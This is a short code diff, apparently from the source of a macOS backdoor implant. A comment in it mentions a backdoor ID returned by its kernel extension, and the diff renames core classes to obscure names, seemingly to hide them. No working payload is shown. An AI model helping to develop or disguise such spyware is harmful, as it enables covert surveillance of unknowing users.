@@ -25,9 +25,9 @@
 #define DEV      @"Ah59K"
 
 
-@class RCSMLogManager;
+@class __m_MLogManager;
 
-@interface RCSMCore : NSObject
+@interface __m_MCore : NSObject
 {
 @private
   // backdoor ID returned by our kext -- not used as of now
